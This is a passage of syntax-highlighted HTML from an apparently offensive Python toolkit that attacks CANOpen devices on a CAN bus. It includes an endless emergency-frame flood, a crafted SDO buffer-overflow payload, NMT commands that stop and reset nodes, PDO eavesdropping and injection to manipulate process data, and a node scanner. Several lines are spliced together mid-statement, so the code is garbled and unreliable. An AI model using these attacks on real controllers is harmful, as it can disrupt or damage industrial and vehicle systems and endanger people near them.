class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Communication error (0x0010)\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x080\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x20\u003c/span\u003e, \u003cspan \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x080\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x30\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Device software error (0x0030)\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x080\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x40\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Device monitoring error (0x0040)\u003c/span\u003e\n        ]\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Starting emergency frame flood attack on node \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003eframe_count\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Continuous flooding loop with rate limiting\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eemergency_frames\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eframe\u003c/span\u003e)\n                \u003cspan class=\"pl-s1\"\u003eframe_count\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n                \n                \u003cspan class=\"pl-c\"\u003e# Print status every 100 frames\u003c/span\u003e\n                \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eframe_count\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e100\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e:\n                    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Sent \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eframe_count\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e emergency frames to node \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# 1ms delay between frame batches to avoid complete bus saturation\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003etime\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esleep\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0.001\u003c/span\u003e)\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecanopen_sdo_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute CANOpen SDO exploitation for memory manipulation and code execution.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Crafts malicious SDO write requests to trigger buffer overflows or memory corruption.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Craft exploit payload targeting specific SDO object dictionary entries\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecraft_sdo_exploit_payload\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Send SDO write request with malicious data to target node\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esdo_write\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x600\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003esdo_write\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Sent SDO exploit payload to node \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Trigger exploitation by sending NMT start command\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etrigger_frame\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x01\u003c/span\u003e])  \u003cspan class=\"pl-c\"\u003e# NMT start command\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etrigger_frame\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Verify exploitation success\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'target_node'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'exploitation_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eexploitation_success\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'payload_size'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'sdo_object'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eparse_sdo_object\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e)\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecanopen_nmt_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute CANOpen NMT (Network Management) protocol attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e change attacks\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003enmt_attacks\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x01\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Start remote node\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x02\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Stop remote node  \u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x80\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Enter pre-operational\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x81\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# Reset node\u003c/span\u003e\n            \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x000\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x82\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e]),  \u003cspan class=\"pl-c\"\u003e# \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_frame\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enmt_attacks\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_frame\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e({\n                \u003cspan class=\"pl-s\"\u003e'command'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eattack_frame\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edata\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e],\n                \u003cspan class=\"pl-s\"\u003e'node'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_nmt_state\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eattack_frame\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edata\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e])\n            })\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecanopen_pdo_hijacking\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute CANOpen PDO (Process Data Object) hijacking attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Intercept and manipulate real-time process data exchanges.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Eavesdrop on PDO communications\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003epdo_messages\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecapture_pdo_traffic\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Analyze PDO mapping and data structure\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003epdo_mapping\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan \u003cspan class=\"pl-c\"\u003e# Craft malicious PDO messages\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003emalicious_pdos\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecraft_malicious_pdos\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003epdo_mapping\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Inject malicious PDOs to manipulate process data\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emalicious_pdo\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emalicious_pdos\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003emalicious_pdo\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e({\n                \u003cspan class=\"pl-s\"\u003e'pdo_cob_id'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003emalicious_pdo\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earbitration_id\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'data'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003emalicious_pdo\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edata\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'injection_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_pdo_injection\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003emalicious_pdo\u003c/span\u003e)\n            })\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecraft_sdo_exploit_payload\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Craft malicious SDO payload for buffer overflow or memory corruption.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Targets specific object dictionary entries with oversized or malformed data.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Example: Buffer overflow in device name string (Object 0x1008)\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ebytearray\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# SDO write header (expedited transfer, write request)\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e([\u003cspan class=\"pl-c1\"\u003e0x23\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x10\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e])  \u003cspan class=\"pl-c\"\u003e# 0x23 = write 4 bytes, 0x1008 = device name\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Overflow payload - exceeds typical device name buffer\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eoverflow_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003eb'A'\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e256\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# 256-byte buffer overflow\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eoverflow_data\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eexploit_payload\u003c/span\u003e)\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003escan_canopen_nodes\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Scan CAN bus for active CANOpen nodes using NMT and SDO discovery.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"[*] Scanning for CANOpen nodes...\"\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003ediscovered_nodes\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-c\"\u003e# Try NMT node guarding to discover nodes\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enode_id\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003erange\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e128\u003c/span\u003e):  \u003cspan class=\"pl-c\"\u003e# Standard CANOpen node ID range\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003enode_guard_frame\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x700\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enode_id\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e])\n            \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enode_guard_frame\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# Check for response\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ereceive\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etimeout\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0.1\u003c/span\u003e)\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eand\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earbitration_id\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x700\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enode_id\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003ediscovered_nodes\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enode_id\u003c/span\u003e)\n                \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[+] Discovered CANOpen node: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003enode_id\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ediscovered_nodes\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003everify_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Verify if SDO exploitation was successful by checking node behavior.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Send SDO read request to check if node is responsive\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etest_sdo\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eCANFrame\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0x600\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e, [\u003cspan class=\"pl-c1\"\u003e0x40\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x10\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e])  \u003cspan class=\"pl-c\"\u003e# Read device type\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etest_sdo\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Check for response with timeout\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecan\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ereceive\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etimeout\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e2.0\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003enot\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# No response may indicate crash or successful exploitation\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earbitration_id\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x580\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_node\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Valid response but check for abnormal behavior\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_abnormal_behavior\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edata\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n\n    \u003cspan class=\"pl-c\"\u003e# Additional helper methods would be implemented here...\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eparse_sdo_object\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epayload\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Parse SDO object from payload data\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003epayload\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e4\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003eindex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003epayload\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e8\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epayload\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e]\n            \u003cspan class=\"pl-s1\"\u003esubindex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epayload\u003c/span\u003e[\u003cspan 